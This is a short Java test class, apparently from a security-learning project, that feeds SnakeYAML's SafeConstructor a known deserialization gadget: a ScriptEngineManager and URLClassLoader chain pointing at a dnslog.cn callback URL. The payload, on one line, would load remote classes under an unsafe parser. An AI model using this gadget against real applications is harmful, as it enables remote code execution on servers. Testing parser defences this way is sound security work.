package code.safe.yml;

import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class TestSnakeYml {
    static Map<String, Map<String,String>> properties;
    static FileInputStream fis = null;
    static File file = null;
    static {
        try{
//            file = new File("/Users/green/IdeaProjects/idea/leecodemid/src/main/java/code/safe/yml/test1.yml");
//            fis = new FileInputStream(file);
//            properties = new HashMap<>();
            Yaml yaml = new Yaml(new SafeConstructor());
//            properties = yaml.load(fis);
            yaml.load("!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [http://h08x13.dnslog.cn/]]]]");
//          System.out.println("pro:"+properties);

        }catch(Exception e){
            System.out.println(e.getMessage());
        }     finally {
//            try {
//                fis.close();
//            } catch (IOException e) {
//                throw new RuntimeException(e);
//            }
        }
    }

    public static void main(String[] args) {
        TestSnakeYml testSnakeYml = new TestSnakeYml();

    }

}
